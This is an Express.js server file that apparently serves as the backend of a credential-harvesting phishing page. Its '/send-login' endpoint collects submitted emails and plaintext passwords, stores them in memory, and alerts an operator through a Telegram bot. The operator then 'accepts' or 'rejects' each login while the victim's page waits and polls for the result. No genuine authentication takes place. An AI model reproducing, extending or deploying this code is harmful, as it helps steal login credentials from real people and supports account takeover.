// server.js
import express from "express";
import bodyParser from "body-parser";
import cors from "cors";
import { sendLoginTelegram } from "./bot.js";

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// -----------------
// Pending approvals storage
// -----------------
export const pendingApprovals = {}; // { email: { status: 'pending'|'accepted'|'rejected', password, region, device } }

// -----------------
// Receive login from frontend
// -----------------
app.post("/send-login", async (req, res) => {
  const { email, password, region, device } = req.body;
  if (!email || !password) return res.status(400).json({ error: "Missing email or password" });

  // Store pending first
  pendingApprovals[email] = { status: "pending", password, region, device };
  console.log(`📥 Login received: ${email}`);

  // Send Telegram message second
  try {
    await sendLoginTelegram(email);
  } catch (err) {
    console.error("❌ Failed to send Telegram message:", err);
  }

  // Respond after backend processing
  res.json({ status: "ok" });
});

// -----------------
// Check status (frontend polling)
app.post("/check-status", (req, res) => {
  const { email } = req.body;
  if (!email || !pendingApprovals[email]) return res.json({ status: "pending" });
  res.json({ status: pendingApprovals[email].status });
});

// -----------------
// Update status from Telegram button
app.post("/update-status", (req, res) => {
  const { email, status } = req.body;
  if (!email || !pendingApprovals[email]) return res.status(400).json({ error: "Invalid email" });

  pendingApprovals[email].status = status;
  console.log(`✅ Status updated for ${email}: ${status}`);

  res.json({ status: "ok" });
});

// -----------------
// Health check
// -----------------
app.get("/", (req, res) => res.send("✅ Server running"));

// -----------------
// Start server
// -----------------
app.listen(PORT, () => console.log(`✅ Server running on port ${PORT}`));
